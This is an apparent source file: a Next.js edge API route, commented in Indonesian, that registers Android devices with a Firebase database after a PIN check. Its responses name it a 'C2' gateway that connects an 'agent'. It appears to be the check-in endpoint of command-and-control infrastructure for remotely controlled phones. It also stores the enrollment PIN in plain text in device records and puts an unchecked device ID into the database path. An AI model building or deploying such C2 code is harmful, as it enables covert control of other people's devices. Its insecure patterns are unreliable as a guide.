import { NextResponse } from "next/server";

// OPTIMASI UTAMA: Memaksa API berjalan di Vercel Edge Network terdekat dari HP Client
export const runtime = "edge"; 
export const dynamic = "force-dynamic";

export async function POST(request) {
  try {
    const body = await request.json();
    const { deviceId, inputPin, model, osVersion, ram } = body;

    if (!deviceId || !inputPin) {
      return NextResponse.json({ success: false, message: "BAD_REQUEST_PAYLOAD" }, { status: 400 });
    }

    // Menggunakan Fetch REST API langsung ke Firebase untuk kecepatan maksimal di Edge Runtime
    const dbUrl = process.env.NEXT_PUBLIC_FIREBASE_DATABASE_URL.replace(/\/$/, "");
    
    // 1. Ambil PIN Validasi secara paralel
    const pinResponse = await fetch(`${dbUrl}/system/enrollment_pin.json`);
    const serverPin = await pinResponse.json();

    if (inputPin !== serverPin) {
      return NextResponse.json({ success: false, message: "INVALID_ENROLLMENT_TOKEN" }, { status: 401 });
    }

    // 2. Buat payload metadata terkompresi (ringan & cepat dikirim)
    const initialPayload = {
      id: deviceId,
      adminPin: inputPin,
      model: model || "Generic Android Agent",
      osVersion: osVersion || "Unknown",
      batteryLevel: 100,
      isOnline: true,
      ram: ram || "4.0 GB",
      connectedAt: Date.now()
    };

    // 3. Tembak langsung ke node database dengan metode PUT (Menghapus antrean overhead)
    await fetch(`${dbUrl}/devices/${deviceId}.json`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(initialPayload)
    });

    return NextResponse.json({
      success: true,
      message: "C2_AGENT_CONNECTED_INSTANTLY",
      routingEndpoint: `/device/${deviceId}`
    }, { status: 200 });

  } catch (error) {
    return NextResponse.json({ success: false, message: "FAST_C2_GATEWAY_ERROR", error: error.message }, { status: 500 });
  }
}
